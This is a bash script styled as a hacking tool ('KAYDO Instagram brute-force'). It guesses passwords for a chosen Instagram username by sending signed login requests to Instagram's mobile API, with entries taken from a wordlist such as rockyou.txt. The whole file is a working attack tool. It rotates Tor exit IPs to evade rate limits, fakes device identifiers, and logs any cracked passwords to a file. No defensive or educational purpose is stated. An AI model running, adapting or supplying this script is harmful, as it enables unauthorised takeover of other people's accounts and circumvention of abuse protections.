#!/bin/bash

# ==========================================
# KAYDO - INSTAGRAM ELITE BRUTE (BASH)
# ==========================================

# 1. التحقق من صلاحيات الروت
if [[ "$EUID" -ne 0 ]]; then
    echo -e "\033[1;91m[!] Please run this script as root (sudo ./kaydo_insta.sh)\033[0m"
    exit 1
fi

# 2. الألوان
R='\033[1;91m'; G='\033[1;92m'; Y='\033[1;93m'
B='\033[1;94m'; C_='\033[1;96m'; W='\033[1;97m'
RESET='\033[0m'; BOLD='\033[1m'; CLEAR='\033[2J\033[H'
D='\033[90m'

# 3. رسم الواجهة (ASCII Art)
draw_banner() {
    clear
    echo -e "${R}${BOLD}"
    cat << "EOF"
   ██╗  ██╗ █████╗ ██╗   ██╗██████╗  ██████╗
   ██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗
   █████╔╝ ███████║ ╚████╔╝ ██║  ██║██║   ██║
   ██╔═██╗ ██╔══██║  ╚██╔╝  ██║  ██║██║   ██║
   ██║  ██╗██║  ██║   ██║   ██████╔╝╚██████╔╝
   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝
EOF
    echo -e "${C_}${BOLD}   ═══════════════════════════════════════════════════${RESET}"
    echo -e "${C_}${BOLD}      INSTAGRAM BRUTE-FORCE  |  KAYDO EDITION  |  v2.0${RESET}"
    echo -e "${C_}${BOLD}   ═══════════════════════════════════════════════════${RESET}"
    echo -e "${RESET}"
}

# 4. دالة تدوير IP في الخلفية
rotate_tor_ip() {
    while true; do
        sleep 10
        killall -HUP tor 2>/dev/null
    done
}

# 5. التحقق من TOR
# 5. التحقق من TOR (طريقة مباشرة وسريعة)
check_tor() {
    echo -e "${Y}[*] Checking TOR connection...${RESET}"
    # التحقق من أن المنفذ 9050 يستمع (يعني TOR شغال)
    if ss -tuln | grep -q ":9050"; then
        echo -e "${G}[✓] TOR is running on port 9050.${RESET}"
    else
        echo -e "${R}[!] TOR is not running. Please run: service tor start${RESET}"
        exit 1
    fi
}


# 6. البدء
draw_banner
check_tor

echo -e "${Y}  ➜ Username Target: ${RESET}\c"
read user

echo -e "${Y}  ➜ Wordlist Path (Enter for default: rockyou.txt): ${RESET}\c"
read wl_path
if [[ -z "$wl_path" ]]; then
    wl_path="rockyou.txt"
fi

if [[ ! -f "$wl_path" ]]; then
    echo -e "${R}  ✖ File not found: $wl_path${RESET}"
    exit 1
fi

echo -e "${Y}  ➜ Speed (1 to 1000 attempts/sec): ${RESET}\c"
read speed
if [[ -z "$speed" ]] || [[ "$speed" -lt 1 ]] || [[ "$speed" -gt 1000 ]]; then
    speed=10
fi

# حساب وقت التأخير
sleep_time=$(awk "BEGIN {print 1/$speed}")

echo -e ""
echo -e "${C_}  ═══════════════════════════════════════════════════${RESET}"
echo -e "${G}${BOLD}        🚀 Starting attack. Press Ctrl+C to stop.${RESET}"
echo -e "${C_}  ═══════════════════════════════════════════════════${RESET}"
echo -e "${D}  Target: $user | Wordlist: $wl_path | Speed: $speed/s${RESET}"
echo -e ""

# تشغيل خيط تغيير IP في الخلفية
rotate_tor_ip &
ROTATE_PID=$!

# التقاط إشارة Ctrl+C لتنظيف الخلفية
trap "kill $ROTATE_PID 2>/dev/null; echo -e '\n${Y}  👋 Stopped by Kaydo.${RESET}'; exit 0" SIGINT

# بيانات الجهاز
GUID=$(cat /proc/sys/kernel/random/uuid)
DEVICE_ID="android-$(head /dev/urandom | tr -dc 'a-f0-9' | head -c 16)"
PHONE_ID=$(cat /proc/sys/kernel/random/uuid)
USER_AGENT='Instagram 269.0.0.18.75 Android (26/8.0.0; 480dpi; 1080x1920; OnePlus; 6T; OnePlus; qcom; en_US; 314665256)'
IG_SIG="19ce5f2f8b9b9c62b1f46b2c9e7b886f0e6d143f112b78639d68c5f8a3b7c4e1"

count=1
total=$(wc -l < "$wl_path")

# حلقة التخمين
while IFS= read -r pass; do
    [[ -z "$pass" ]] && continue
    
    # عرض الحالة (شريط متحرك)
    printf "\r${C_}  [%d/%d] Trying: ${W}%-15s${RESET} " "$count" "$total" "${pass:0:15}"
    
    # بناء البيانات
    data="{\"phone_id\":\"$PHONE_ID\",\"_csrftoken\":\"missing\",\"username\":\"$user\",\"guid\":\"$GUID\",\"device_id\":\"$DEVICE_ID\",\"password\":\"$pass\",\"login_attempt_count\":\"0\"}"
    
    # التوقيع
    hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$IG_SIG" | awk '{print $2}')
    signed_body="$hmac.$data"
    
    # إرسال الطلب
    response=$(curl --socks5 127.0.0.1:9050 -s -X POST \
        -H "User-Agent: $USER_AGENT" \
        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
        -d "ig_sig_key_version=4&signed_body=$signed_body" \
        "https://i.instagram.com/api/v1/accounts/login/")
    
    # تحليل الرد
    if echo "$response" | grep -q "logged_in_user"; then
        echo -e "\n${G}${BOLD}  [✓] PASSWORD FOUND: $pass${RESET}"
        echo "Username: $user | Password: $pass" >> kaydo_found.txt
        echo -e "${G}  [+] Saved to kaydo_found.txt${RESET}"
        kill $ROTATE_PID 2>/dev/null
        exit 0
    elif echo "$response" | grep -q "challenge_required"; then
        echo -e "\n${Y}  [!] Challenge Required. Password might be correct: $pass${RESET}"
        echo "Username: $user | Password: $pass (CHALLENGE)" >> kaydo_found.txt
        kill $ROTATE_PID 2>/dev/null
        exit 0
    elif echo "$response" | grep -q "Please wait"; then
        echo -e "\n${R}  [!] Rate Limit reached. Waiting for TOR IP rotation...${RESET}"
        killall -HUP tor 2>/dev/null
        sleep 5
    fi
    
    sleep "$sleep_time"
    ((count++))
    
done < "$wl_path"

kill $ROTATE_PID 2>/dev/null
echo -e "\n${G}  [*] Wordlist finished.${RESET}"
